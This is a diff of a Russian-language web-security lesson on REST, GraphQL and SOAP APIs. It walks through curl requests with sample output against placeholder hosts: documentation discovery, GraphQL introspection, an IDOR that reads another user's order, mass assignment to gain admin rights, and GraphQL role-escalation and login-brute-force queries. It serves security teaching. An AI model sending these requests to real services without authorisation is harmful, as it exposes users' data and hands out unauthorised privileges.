@@ -10,298 +10,220 @@ prerequisites: [web-architecture]
 useful_for:
   - "CTF Web категория"
   - "Bug bounty"
+  - "Пентест веб-приложений"
 estimated_minutes: 45
-summary: "Три парадигмы API, как их различать, находить документацию и где в каждой из них живут уязвимости."
+summary: "Как устроены REST, GraphQL и SOAP, как найти их документацию и почему API часто уязвимее интерфейса."
 ---
 
-Современные приложения — это SPA или мобильное приложение поверх **API**. Если вы понимаете, как выглядит API, вы найдёте половину багов быстрее. Существует три больших парадигмы: REST, GraphQL и SOAP. У каждой свои соглашения, своя документация и свои типовые ошибки. В этом уроке — как определить, с чем вы имеете дело, и где искать документацию.
+Разведка показала у магазина раздел `/api/`. Это «машинный» интерфейс: им пользуются не люди, а код (фронтенд, мобильное приложение, другие сервисы). И именно поэтому API часто уязвимее UI — он повторяет ту же логику, но без защиты, которую даёт страница.
 
-## Теория: REST
+В этом уроке мы возьмём API магазина `api.shop.local` и разберём **один** его интерфейс: как его картировать и где искать ошибки авторизации.
 
-**REST** — это стиль, а не стандарт. Ресурсы адресуются путями, действия — HTTP-методами:
+## Наш пример: API магазина
 
+Обратимся к корню API:
+
+```bash
+$ curl -s -i 'https://api.shop.local/' | head -5
+HTTP/1.1 200 OK
+Content-Type: application/json
+{"name":"shop-api","version":"v1","docs":"/swagger"}
 ```
-GET    /api/v1/users          -> список
-GET    /api/v1/users/42       -> один
-POST   /api/v1/users          -> создать
-PUT    /api/v1/users/42       -> заменить
-PATCH  /api/v1/users/42       -> частично изменить
-DELETE /api/v1/users/42       -> удалить
+
+Ответ — JSON (не HTML), и он сам подсказывает, где документация: `/swagger`.
+
+## Шаг 1: REST — ресурсы и методы
+
+**REST** — стиль, где каждый объект — это **ресурс** со своим URL, а действие задаётся HTTP-методом:
+
+| Метод | Действие | Пример |
+|-------|----------|--------|
+| `GET` | прочитать | `GET /api/v1/products/7` |
+| `POST` | создать | `POST /api/v1/products` |
+| `PUT` | заменить | `PUT /api/v1/products/7` |
+| `DELETE` | удалить | `DELETE /api/v1/products/7` |
+
+Проверим:
+
+```bash
+$ curl -s 'https://api.shop.local/api/v1/products/7'
+{"id":7,"name":"Кружка «Хакер»","price":990,"stock":12}
 ```
 
-Форматы: обычно JSON (`Content-Type: application/json`), иногда XML или form-urlencoded. Ключевые для тестировщика свойства:
+Ресурс отдаётся как JSON. Обрати внимание: идентификатор прямо в пути (`/products/7`). Это ключ к уязвимости IDOR — если авторизацию не проверяют, можно перебрать чужие объекты.
 
-- **Идентификаторы в пути** (`/users/42`) → прямой кандидат на IDOR/BOLA (см. `web-api-security`).
-- **Версионирование** (`/v1/`, `/v2/`) → старые версии часто оставляют без патчей.
-- **Пагинация/фильтры** (`?page=`, `?limit=`, `?sort=`, `?fields=`) → инъекции и mass assignment.
-- **HATEOAS** (`_links`) — редко, но указывает на связанные ресурсы.
+## Шаг 2: находим документацию
 
-## Теория: GraphQL
+Многие API отдают машинно-читаемую спецификацию (**OpenAPI/Swagger**), где перечислены все эндпоинты, параметры и схемы:
 
-**GraphQL** — единая точка входа (`POST /graphql`), где клиент сам описывает, какие поля ему нужны. Вместо множества эндпоинтов — один, а «запрос» — это тело с `query`/`mutation`.
+```bash
+$ curl -s 'https://api.shop.local/swagger.json' | head -c 300
+{"openapi":"3.0.0","paths":{"/api/v1/products/{id}":{"get":{...}},
+"/api/v1/users/{id}":{"get":{...}},"/api/v1/admin/orders":{"get":{...}}}}
+```
+
+Из спецификации сразу видно скрытый `/api/v1/admin/orders` и `/api/v1/users/{id}`. Документация — подарок для тестировщика; часто её оставляют включённой в проде. Другие типовые адреса: `/swagger`, `/api-docs`, `/openapi.json`, `/v2/api-docs`.
+
+## Шаг 3: GraphQL — спрашивай что хочешь
+
+Часть API может быть на **GraphQL** — другом стиле, где вместо набора URL один эндпоинт (`/graphql`), а клиент сам описывает, какие поля хочет получить. У GraphQL есть встроенная **интроспекция** — возможность спросить «а какие типы и поля у тебя есть?»:
+
+```bash
+$ curl -s -X POST 'https://api.shop.local/graphql' \
+    -H 'Content-Type: application/json' \
+    -d '{"query":"{__schema{types{name}}}"}' | head -c 200
+{"data":{"__schema":{"types":[{"name":"User"},{"name":"Order"},{"name":"Product"},...
+```
+
+Если интроспекция открыта, ты получаешь всю схему данных — как карту сокровищ. Ещё одна типичная проблема GraphQL — **отсутствие лимита на глубину/сложность** запроса: вложенный запрос может уронить сервер (DoS).
+
+## Шаг 4: тестируем авторизацию (IDOR)
+
+Самая частая ошибка API — он проверяет, что ты залогинен, но **не проверяет, что объект твой**. Это **IDOR** (Insecure Direct Object Reference). Смотрим свой заказ:
+
+```bash
+$ curl -s 'https://api.shop.local/api/v1/orders/1001' -b 'session=me'
+{"id":1001,"user":"me","total":990}
+```
+
+Меняем идентификатор на чужой:
+
+```bash
+$ curl -s 'https://api.shop.local/api/v1/orders/1002' -b 'session=me'
+{"id":1002,"user":"victim","total":4500,"address":"ул. ..."}
+```
+
+Мы получили чужой заказ с адресом доставки. **IDOR подтверждён** — авторизация не проверяется на уровне объекта. То же проверяй на `/api/v1/users/{id}`, `/invoices/{id}` и т. п.
+
+Ещё один частый баг API — **mass assignment**: если сервер слепо берёт все поля из JSON, можно добавить лишнее:
+
+```bash
+$ curl -s -X PATCH 'https://api.shop.local/api/v1/users/me' -b 'session=me' \
+    -H 'Content-Type: application/json' -d '{"email":"me@shop.local","role":"admin"}'
+{"id":1,"email":"me@shop.local","role":"admin"}
+```
+
+Поле `role` не показывалось в UI, но сервер его принял — привилегии повышены.
+
+## Шаг 5: SOAP и другие протоколы
+
+Кроме REST и GraphQL встречается **SOAP** — старый протокол на XML, где всё передаётся одним методом `POST` на один URL, а действие указано внутри XML. Его тестируют так же: ищи `?wsdl` (описание сервиса), проверяй инъекции в XML-полях (XXE) и авторизацию. Общий принцип для любого API:
+
+1. **Найди спецификацию** (`swagger`, `wsdl`, introspection).
+2. **Перечисли все эндпоинты** (в т. ч. скрытые из UI).
+3. **Проверь авторизацию на каждом** (IDOR, вертикальный доступ).
+4. **Проверь, что поля принимаются** (mass assignment).
+5. **Проверь вход** на инъекции (JSON/XML/SQL).
+
+## Шаг 6: SOAP и WSDL
+
+**SOAP** — старый протокол на XML: всё передаётся одним `POST` на один URL, а действие указано внутри XML-конверта. Описание сервиса лежит в **WSDL**:
+
+```bash
+$ curl -s 'https://api.shop.local/legacy?wsdl' | grep -oE '<xsd:element name="[^"]+"' | head
+<xsd:element name="GetOrder"
+<xsd:element name="GetUser"
+```
+
+Из WSDL видны все операции и их поля — это карта. Тестируют SOAP так же: проверяй авторизацию каждой операции и инъекции в XML-полях (например, XXE — подстановку внешней сущности).
+
+## GraphQL: глубина и батчинг
+
+Две типичные проблемы GraphQL помимо интроспекции. **Глубина/сложность:** вложенный запрос заставляет сервер раскручивать дерево — без лимита это отказ в обслуживании:
 
 ```graphql
-query {
-  user(id: 42) { id email role }
-}
+{ user { orders { user { orders { user { id } } } } } }
 ```
 
-Уязвимости GraphQL специфичны:
+**Батчинг:** один запрос может содержать список операций, что обходит rate-limit и позволяет перебирать значения быстрее.
 
-1. **Introspection** (`__schema`) — если включена, вы получаете всю схему: типы, поля, аргументы, мутации. Это карта API.
-2. **Отсутствие авторизации на поле** — top-level запрос может быть защищён, а вложенное поле отдаёт чужие данные.
-3. **Batching** — множество операций в одном запросе; помогает обходить rate-limit и брутить.
-4. **Alias overloading** — много алиасов одного запроса для перебора/DoS.
-5. **Injection в аргументах** — если резолверы конкатенируют строки (SQLi/NoSQLi внутри резолвера).
-6. **Depth/complexity abuse** — рекурсивные связи (`user -> posts -> author -> posts...`) валят сервер.
+## Полный прогон: от документации до чужого заказа
 
-## Теория: SOAP
+1. Корень API отдаёт ссылку на `/swagger` → забираем спецификацию.
+2. Из неё видим `/api/v1/orders/{id}`.
+3. Смотрим свой заказ `GET /api/v1/orders/1001` — `{"user":"me"}`.
+4. Меняем id на `1002` — приходит чужой заказ с адресом доставки.
 
-**SOAP** — старый XML-протокол: один эндпоинт, `POST`, тело — XML с `Envelope`/`Body`, описание в **WSDL** (`?wsdl`). Уязвимости: **XXE** (см. `web-xxe`), **XML bomb**, injection в XML-полях, слабая аутентификация WS-Security. Если видите `Content-Type: text/xml` и `SOAPAction` — это SOAP.
+Артефакт — данные чужого заказа, полученные сменой идентификатора (IDOR).
 
-## Инструменты: как найти API и документацию
+## Справочная таблица: где искать баги API
 
-Определить тип по ответу:
+| Интерфейс | Типовые проблемы |
+|-----------|------------------|
+| REST | IDOR, mass assignment, отсутствие авторизации |
+| GraphQL | открытая интроспекция, глубина/батчинг, авторизация полей |
+| SOAP | XXE, авторизация операций, раскрытие WSDL |
 
-```bash
-curl -s -i https://target.local/api/v1/health
-curl -s -i -X POST https://target.local/graphql -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'
-curl -s -i 'https://target.local/service?wsdl'
-```
+Отдельно проверяй **версии** API: `/api/v1` и `/api/v2` часто обслуживаются одним кодом, но старая версия может не иметь новых проверок авторизации. И не забывай про **токены**: API чаще работает по `Authorization: Bearer`, и утечка ключа (из JS-бандла, логов, репозитория) даёт прямой доступ ко всем ручкам.
 
-Поиск документации — это самое ценное на этапе разведки. Пробуйте типовые пути:
+## Что мы теперь знаем
 
-```bash
-for p in swagger.json swagger/v1/swagger.json openapi.json api-docs v2/api-docs \
-         .well-known/openapi.json graphql graphiql playground api/graphql; do
-  code=$(curl -s -o /dev/null -w '%{http_code}' "https://target.local/$p")
-  echo "$code $p"
-done
-```
+- API — «машинный» интерфейс; он часто уязвимее UI, потому что повторяет логику без защиты страницы.
+- REST: ресурс = URL, действие = метод; идентификаторы в пути → риск IDOR.
+- Документация (`swagger.json`, `wsdl`, introspection) — готовая карта API.
+- GraphQL: один эндпоинт, интроспекция открывает схему; опасны глубина запросов.
+- Главные баги API: IDOR, mass assignment, отсутствие авторизации.
 
-Лучше — через ffuf с wordlist API-путей (см. `web-tooling` и `web-recon-fuzzing`).
+## На что смотреть дальше
 
-Извлечь схему GraphQL (если introspection включена):
-
-```bash
-curl -s -X POST https://target.local/graphql -H 'Content-Type: application/json' \
-  -d '{"query":"{__schema{types{name kind fields{name}}}}"}' | jq .
-```
-
-Инструменты: **graphql-voyager** (визуализация схемы), **InQL** (Burp-расширение), **clairvoyance** (схема без introspection).
-
-## Разобранный пример: от SPA-бандла к API
-
-Шаг 1. Открываем приложение, DevTools → Network. Видим XHR к `https://api.target.local/v2/`.
-
-Шаг 2. Ищем в JS-бандле все пути API:
-
-```bash
-curl -s https://target.local/static/js/app.js -o app.js
-grep -oE '"/api/[a-zA-Z0-9_/{}-]+"' app.js | sort -u
-```
-
-Шаг 3. Находим `openapi.json`:
-
-```bash
-curl -s https://api.target.local/openapi.json | jq '.paths | keys'
-```
-
-Теперь у вас список всех эндпоинтов с параметрами. Дальше — тестирование авторизации и инъекций.
-
-Шаг 4. Для GraphQL — включаем introspection и получаем мутации:
-
-```bash
-curl -s -X POST https://api.target.local/graphql -H 'Content-Type: application/json' \
-  -d '{"query":"{__schema{mutationType{fields{name args{name type{name}}}}}}"}' | jq .
-```
-
-Видим мутацию `updateUserRole` — прямой кандидат на BFLA/mass-assignment.
-
-## Частые ошибки
-
-- **Искать только UI-пути.** API живёт отдельно; ключ — JS-бандлы, `swagger`, мобильные клиенты.
-- **Считать GraphQL «защищённым».** Отключённая introspection не мешает отправлять запросы по известным именам полей (clairvoyance их восстанавливает).
-- **Забывать про старые версии.** `/v1/` рядом с `/v2/` часто не пропатчен.
-- **Путать GraphQL-ошибки.** Ответ всегда `200 OK` с полем `errors` — не ориентируйтесь только на HTTP-код.
-- **Игнорировать WSDL.** `?wsdl` открывает полное описание SOAP-сервиса со всеми операциями.
-- **Слать массово.** Для перебора путей используйте ffuf с `-maxtime`; ручные циклы `for p in ...; do curl` — плохая практика (нагрузка и беспорядок).
-
-## Полный разбор: GraphQL introspection → брут полей (с выводом)
-
-Шаг 1. Проверяем, включена ли introspection:
-
-```bash
-curl -s -X POST https://api.target.local/graphql -H 'Content-Type: application/json' \
-  -d '{"query":"{__typename}"}'
-# {"data":{"__typename":"Query"}}
-```
-
-Шаг 2. Выгружаем типы и поля:
-
-```bash
-curl -s -X POST https://api.target.local/graphql -H 'Content-Type: application/json' \
-  -d '{"query":"{__schema{types{name kind fields{name type{name kind ofType{name}}}}}}}"}' \
-  | jq -r '.data.__schema.types[] | select(.kind=="OBJECT") | "\(.name): \(.fields|map(.name)|join(", "))"'
-# User: id, username, email, role, passwordHash
-# Query: user, users, adminPanel
-# Mutation: updateUserRole, deleteUser, login
-```
-
-Шаг 3. Пробуем «дорогие» поля напрямую (часто авторизация на уровне типа, а не поля):
-
-```bash
-curl -s -X POST https://api.target.local/graphql -H 'Content-Type: application/json' \
-  -d '{"query":"{user(id:1){id username email role passwordHash}}"}'
-# {"data":{"user":{"id":1,"username":"admin","role":"admin","passwordHash":"..."}}}
-# -> утечка секретного поля
-```
-
-Шаг 4. Если introspection выключена, восстанавливаем схему по ошибкам и словарю (clairvoyance):
-
-```bash
-python3 clairvoyance.py -o schema.json -u https://api.target.local/graphql -w fieldnames.txt
-```
-
-Шаг 5. Пробуем мутации для эскалации (BFLA):
-
-```bash
-curl -s -X POST https://api.target.local/graphql -H 'Content-Type: application/json' \
-  -d '{"query":"mutation{updateUserRole(userId:1,role:\"admin\"){ok}}"}'
-```
-
-## Reference-таблица: REST/GraphQL/SOAP — где какие баги
-
-| Парадигма | Точки входа | Типовые уязвимости |
-|-----------|-------------|--------------------|
-| REST | `/api/vN/<res>/<id>` | BOLA/IDOR, mass assignment, инъекции, старая версия |
-| REST | `?fields=`,`?expand=` | over-fetching приватных полей |
-| GraphQL | `/graphql` (одна точка) | introspection, авторизация на уровне поля, batching/aliasing, depth DoS |
-| GraphQL | мутации | BFLA, mass assignment |
-| SOAP | `?wsdl`, `POST text/xml` | XXE, XML bomb, WS-Security слабости, injection в полях |
-| Любая | документация | `/swagger.json`, `/openapi.json`, `/graphiql`, `?wsdl` |
-
-## GraphQL: batching, aliasing, depth DoS, авторизация на уровне полей
-
-- **Aliasing:** один запрос вызывает одно поле много раз под разными алиасами — обход rate-limit и брут:
-  ```graphql
-  { a0: login(user:"admin",pass:"1") a1: login(user:"admin",pass:"2") ... }
-  ```
-- **Batching (массив запросов):** сервер, принимающий `[{query:...},{query:...}]`, выполняет их пачкой — тот же обход лимитов.
-- **Depth/complexity DoS:** рекурсивные вложенные поля (`user{friends{friends{...}}}`) кладут сервер; проверяйте лимиты глубины.
-- **Авторизация на уровне поля:** тип защищён, а `passwordHash`/`role` — нет; перебирайте все поля типа.
-- **Introspection off ≠ безопасно:** clairvoyance восстановит схему по suggestions/ошибкам.
-- **GET-мутации:** `?query=mutation{...}` — CSRF-вектор.
-
-## SOAP/WSDL: XXE и операционные уязвимости
-
-```bash
-curl -s 'https://target.local/service?wsdl' | head -40   # полное описание операций
-```
-
-- **XXE:** XML-парсер без запрета внешних сущностей → чтение файлов/SSRF (см. `web-xxe`).
-- **XML bomb (billion laughs):** экспоненциальное раскрытие сущностей → DoS.
-- **WS-Security:** слабая подпись/шифрование, replay, отсутствие timestamp-проверки.
-- **Injection в полях:** значения SOAP-полей уходят в БД/систему — SQLi/командная инъекция.
-- **WSDL как карта:** он перечисляет все операции и типы — не игнорируйте `?wsdl`.
-
-## Что делать дальше / решение
-
-1. **Определить парадигму** (REST/GraphQL/SOAP) по ответу/заголовкам.
-2. **Найти документацию** (`swagger.json`, `openapi.json`, `graphiql`, `?wsdl`).
-3. **GraphQL:** включить introspection или восстановить схему (clairvoyance), затем тестировать авторизацию **на уровне поля**.
-4. **REST:** пройтись по всем ресурсам/версиям, проверить BOLA/mass assignment.
-5. **SOAP:** проверить XXE, XML bomb, WS-Security.
-6. **Зафиксировать** найденные эндпоинты и уязвимые операции как артефакт.
-
-## OpenAPI/Swagger: как читать спеку и находить баги
-
-Спецификация OpenAPI — лучшая карта API. Получив `openapi.json`/`swagger.json`:
-
-```bash
-curl -s https://api.target.local/openapi.json -o api.json
-jq -r '.paths | to_entries[] | "\(.key)  [\(.value|keys|join(","))]"' api.json
-# /users/{id}  [get,put,delete]
-# /admin/users [get]
-# /orders      [get,post]
-```
-
-Что искать в спеке:
-
-- **Скрытые/админские пути** (`/admin`, `/internal`, `/debug`) — сразу проверить доступ.
-- **Методы** — `PUT/PATCH/DELETE` на объектах (mass assignment, BFLA).
-- **Параметры** — `sort`, `filter`, `fields`, `expand` (инъекции, over-fetching).
-- **`security`/`securitySchemes`** — какие эндпоинты без auth (сравнить с фактическим поведением).
-- **Схемы (`components/schemas`)** — все поля объектов; ищите `role`, `isAdmin`, `balance`, `password` → mass assignment.
-- **`$ref`** — раскрывают связанные модели.
-
-```bash
-jq -r '.components.schemas.User.properties | keys[]' api.json
-# id username email role isAdmin passwordHash
-```
-
-Если `isAdmin`/`role` есть в схеме, но не в UI — попробуйте передать их при регистрации/обновлении (mass assignment). Если эндпоинт без `security` — проверьте доступ без токена. Swagger UI (`/swagger-ui`, `/docs`) позволяет слать запросы прямо из браузера — удобно для быстрой проверки.
-
-## Быстрый чек-лист по API
-
-1. **Найти спеку:** `/swagger.json`, `/openapi.json`, `/api-docs`, `/graphiql`, `?wsdl`.
-2. **Инвентаризировать эндпоинты** (из спеки и JS-бандла), включая старые версии.
-3. **Проверить авторизацию** на каждом: без токена, с чужим ID (BOLA), с низкой ролью (BFLA).
-4. **Mass assignment:** передать `role`/`isAdmin`/`balance` в create/update.
-5. **GraphQL:** introspection или clairvoyance; авторизация на уровне поля; batching/aliasing.
-6. **SOAP:** `?wsdl`, XXE, XML bomb, WS-Security.
-7. **Зафиксировать** найденные ручки и уязвимые операции как артефакт.
+- **Авторизация на уровне полей.** GraphQL может отдавать поле, к которому у тебя нет прав.
+- **BOLA/IDOR.** Меняй идентификаторы в путях и аргументах.
+- **Версии API.** `/api/v1`, `/api/v2` — старая версия часто без новых проверок.
 
 ## Квиз
 
-Выберите один вариант в каждом вопросе.
+Выбери один вариант в каждом вопросе.
 
 ```quiz
-- question: "Чем REST отличается от GraphQL?"
+- question: "Что такое REST-ресурс?"
   options:
-    - "REST использует один эндпоинт, GraphQL — много"
-    - "GraphQL использует один эндпоинт и клиент выбирает поля"
-    - "REST работает только с XML"
-    - "GraphQL не использует HTTP"
+    - "Один эндпоинт для всех операций"
+    - "Объект со своим URL, действие задаётся HTTP-методом"
+    - "Только GraphQL-запрос"
+    - "XML-конверт"
   answer: 1
-  explanation: "GraphQL — единая точка входа, запрос описывает нужные поля."
-- question: "Что даёт включённая introspection в GraphQL?"
+  explanation: "В REST URL указывает на ресурс, а метод — на действие (GET/POST/...)."
+- question: "Почему открытая документация API (`swagger.json`) полезна атакующему?"
   options:
-    - "Ускоряет запросы"
-    - "Раскрывает всю схему (типы, поля, мутации)"
-    - "Включает кэширование"
-    - "Защищает от инъекций"
+    - "Она ускоряет сайт"
+    - "Она перечисляет все эндпоинты, параметры и схемы"
+    - "Она шифрует трафик"
+    - "Она блокирует CORS"
   answer: 1
-  explanation: "`__schema` отдаёт полную карту API."
-- question: "По какому признаку узнать SOAP?"
+  explanation: "Спецификация — готовая карта API, включая скрытые из UI ручки."
+- question: "Что такое интроспекция в GraphQL?"
   options:
-    - "`Content-Type: application/json`"
-    - "`Content-Type: text/xml` и `SOAPAction`"
-    - "`Accept: text/event-stream`"
-    - "`Content-Type: multipart/form-data`"
+    - "Перебор паролей"
+    - "Встроенный запрос схемы (типы и поля)"
+    - "Шифрование ответа"
+    - "Редирект на HTTPS"
   answer: 1
-  explanation: "SOAP — XML-конверт с заголовком `SOAPAction`; описание в WSDL."
-- question: "Где чаще всего искать документацию REST API?"
+  explanation: "Интроспекция раскрывает всю схему данных, если не отключена."
+- question: "Что такое IDOR?"
   options:
-    - "`/robots.txt`"
-    - "`/swagger.json`, `/openapi.json`, `/api-docs`"
-    - "`/favicon.ico`"
-    - "`/sitemap.xml`"
+    - "Отказ в обслуживании"
+    - "Доступ к чужому объекту по прямому идентификатору без проверки прав"
+    - "Подмена TLS"
+    - "Ошибка CORS"
   answer: 1
-  explanation: "Спецификации OpenAPI/Swagger обычно отдаются по этим путям."
-- question: "Почему GraphQL-ответ с ошибкой может прийти с кодом 200?"
+  explanation: "Сервер проверяет аутентификацию, но не проверяет, что объект принадлежит тебе."
+- question: "Чем опасен mass assignment?"
   options:
-    - "Это баг сервера"
-    - "GraphQL кладёт ошибки в тело ответа в поле `errors`"
-    - "Так работает кэш"
-    - "Это означает успех"
-  answer: 1
-  explanation: "GraphQL возвращает `200` и JSON с полем `errors`; смотрите тело, а не только код."
+    - "Сервер слепо принимает лишние поля (например, `role:admin`)"
+    - "Замедляет API"
+    - "Ломает TLS"
+    - "Отключает GraphQL"
+  answer: 0
+  explanation: "Лишнее поле из JSON попадает в объект и повышает привилегии."
 ```
+
+## Куда дальше
+
+Мы прошли весь базовый вход в веб: HTTP → TLS → архитектура → сессии → клиентские хранилища → фиксация → токены → разведка → API. Дальше дерево расходится на конкретные классы атак (XSS, SQLi, SSRF и другие) — выбирай ветку и углубляйся. А пока главное: **API повторяет бизнес-логику, но часто без защиты UI — начинай с его документации и проверяй авторизацию на каждом эндпоинте.**
 
 ## Где пригодится
 
-- **CTF (Web):** задачи часто дают SPA/GraphQL; introspection и скрытые мутации — ключ к решению.
-- **Bug bounty:** API-эндпоинты без UI, старые версии, BOLA — основной источник выплат.
-- **Пентест:** инвентаризация API — обязательный этап; без неё покрытие тестирования неполное.
-- **Работа (AppSec):** ревью OpenAPI-спеки и GraphQL-схемы на предмет избыточных полей — часть secure design review.
+- **CTF (Web):** API-задачи — половина категории; introspection и IDOR встречаются постоянно.
+- **Bug bounty:** IDOR и mass assignment в API — одни из самых дорогих багов.
+- **Пентест:** тестирование API — отдельный обязательный этап.
+- **Работа (AppSec/Dev):** проектирование авторизации на уровне объектов и валидация входных полей.
